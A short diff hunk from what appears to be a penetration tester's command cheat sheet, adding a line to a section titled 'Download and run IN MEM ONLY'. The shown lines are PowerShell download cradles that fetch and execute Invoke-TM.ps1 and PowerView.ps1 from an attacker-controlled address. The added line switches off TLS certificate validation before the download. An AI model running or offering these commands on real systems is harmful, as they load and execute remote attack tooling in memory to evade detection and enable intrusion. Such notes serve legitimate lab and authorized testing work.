@@ -12,6 +12,9 @@ functions:
         Download and run IN MEM ONLY:
         IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.119.149/Invoke-TM.ps1'))
         IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.119.149:8000/PowerView.ps1'))
+		
+		Ignore Cert Trusts
+		powershell -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ;(New-Object System.Net.WebClient).DownloadString('https://192.168.119.149:8000/Invoke-TM.ps1')
 
 
         +++++++++certutil+++++++++
